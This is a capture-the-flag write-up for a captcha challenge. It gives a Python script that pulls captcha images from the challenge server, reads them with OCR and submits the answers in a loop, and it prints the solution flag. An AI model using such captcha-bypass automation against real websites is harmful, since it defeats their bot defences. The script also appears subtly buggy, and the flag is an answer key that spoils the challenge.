# Captcha
**Category:** Very Hard
**Points:** 800
**Solves:** 8
**Description:**

>Now presenting: Revolutionary new bot deterrant - The Craptcha. Works a bit too well... Even humans dont have the skill or patience to get past. Automate the captcha reading and answering process to get the flag.
>
>Flag is in format: CC##-####-####-####
>
>You cant access the site [here](http://ctfp.ee:9999/)

# Write-up
by BubblyPen

This flashy website approves only the correct captchas. Doing it by hand will take forever. So I made this fancy python script to automate the process.

```python
#!/bin/python3

#Imports
import pytesseract
import requests
import cv2
import webbrowser

#Global variables
s = requests.session()
x = 0

for i in range(0, 10000):
    
    #Get img
    response = requests.get("http://ctfp.ee:9999/captcha.php")
    
    file = open("captcha.jpeg", "wb")
    
    file.write(response.content)
    
    file.close()


    #Captha -> text && check if correct
    img = cv2.imread("captcha.jpeg")
    
    txt = pytesseract.image_to_string(img)[:-2]
    
    print(txt + ' ' + str(x) + '/10000')

    
    #Send it    
    url = 'http://ctfp.ee:9999/'
    
    r = s.post(url, data={'hash': txt})
    
    if 'wrong' in r.text or i == 10000:
    
        print(r.text)
    
    x = x + 1
```

***Flag:*** CC20-xJkL-c72A-092h
